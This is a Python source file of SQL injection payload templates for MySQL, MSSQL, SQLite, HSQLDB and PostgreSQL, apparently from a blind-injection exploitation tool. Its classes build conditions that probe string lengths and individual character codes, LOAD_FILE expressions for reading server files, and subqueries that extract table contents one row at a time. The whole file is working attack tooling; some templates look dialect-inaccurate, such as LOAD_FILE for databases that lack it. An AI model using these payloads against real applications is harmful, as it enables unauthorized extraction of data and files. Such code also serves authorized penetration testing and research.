class MysqlPayloads:

    def __init__(self, prefix='', space=' '):
        self.prefix = prefix
        self.space = space

        self.and_size_eq = self.prefix + self.space + "LENGTH({})={}"
        self.and_size_lt = self.prefix + self.space + "LENGTH({})<{}"
        self.and_size_gt = self.prefix + self.space + "LENGTH({})>{}"

        self.and_char_at_is = self.prefix + self.space + "ascii(SUBSTRING({},{},1))={}"
        self.and_char_at_lt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))<{}"
        self.and_char_at_gt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))>{}"

        self.str_file = "(LOAD_FILE({}))"

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT{0}{1}{0}from{0}{2}{0}{3}{0}LIMIT{0}1{0}OFFSET{0}{4})".format(self.space, column, table, where,
                                                                                     offset)

    def where(self, param, value):
        return "WHERE{0}{1}={2}".format(self.space, param, value)


class MssqlPayloads:

    def __init__(self, prefix='', space=' '):
        self.prefix = prefix
        self.space = space

        self.and_size_eq = self.prefix + self.space + "LEN({})={}"
        self.and_size_lt = self.prefix + self.space + "LEN({})<{}"
        self.and_size_gt = self.prefix + self.space + " LEN({})>{}"

        self.and_char_at_is = self.prefix + self.space + "ascii(SUBSTRING({},{},1))={}"
        self.and_char_at_lt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))<{}"
        self.and_char_at_gt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))>{}"

        self.str_file = "(LOAD_FILE({}))"

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT TOP 1 {} FROM (SELECT TOP {} {} from {} {} ORDER BY {} DESC) a ORDER BY {})" \
            .replace(' ', self.space).format(column, offset + 1, column, table, where, column, column)


class SqlitePayloads:

    def __init__(self, prefix='', space=' '):
        self.prefix = prefix
        self.space = space

        self.and_size_eq = self.prefix + self.space + "LENGTH({})={}"
        self.and_size_lt = self.prefix + self.space + "LENGTH({})<{}"
        self.and_size_gt = self.prefix + self.space + "LENGTH({})>{}"

        self.and_char_at_is = self.prefix + self.space + "unicode(SUBSTR({},{},1))={}"
        self.and_char_at_lt = self.prefix + self.space + "unicode(SUBSTR({},{},1))<{}"
        self.and_char_at_gt = self.prefix + self.space + "unicode(SUBSTR({},{},1))>{}"

        self.str_file = "(LOAD_FILE({}))"

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)


class HSQLDBPayloads:

    def __init__(self, prefix='', space=' '):
        self.prefix = prefix
        self.space = space

        self.and_size_eq = self.prefix + self.space + "CHARACTER_LENGTH({})={}"
        self.and_size_lt = self.prefix + self.space + "CHARACTER_LENGTH({})<{}"
        self.and_size_gt = self.prefix + self.space + "CHARACTER_LENGTH({})>{}"

        self.and_char_at_is = self.prefix + self.space + "ASCII(SUBSTR({},{},1))={}"
        self.and_char_at_lt = self.prefix + self.space + "ASCII(SUBSTR({},{},1))<{}"
        self.and_char_at_gt = self.prefix + self.space + "ASCII(SUBSTR({},{},1))>{}"

        self.str_file = "(LOAD_FILE({}))"

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)


class ErrorOnString(object):

    def __init__(self, message):
        self.message = message

    def __str__(self):
        raise Exception(self.message)


class PGSQLPayloads:

    def __init__(self, prefix='', space=' '):
        self.prefix = prefix
        self.space = space

        self.and_size_eq = self.prefix + self.space + "LENGTH({})={}"
        self.and_size_lt = self.prefix + self.space + "LENGTH({})<{}"
        self.and_size_gt = self.prefix + self.space + "LENGTH({})>{}"

        self.and_char_at_is = self.prefix + self.space + "ascii(SUBSTRING({},{},1))={}"
        self.and_char_at_lt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))<{}"
        self.and_char_at_gt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))>{}"

        self.str_file = ErrorOnString('Postgresql do not support direct file read (try use COPY in TEMP TABLE)')

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT{0}{1}{0}from{0}{2}{0}{3}{0}LIMIT{0}1{0}OFFSET{0}{4})".format(self.space, column, table, where,
                                                                                     offset)

    def where(self, param, value):
        return "WHERE{0}{1}={2}".format(self.space, param, value)
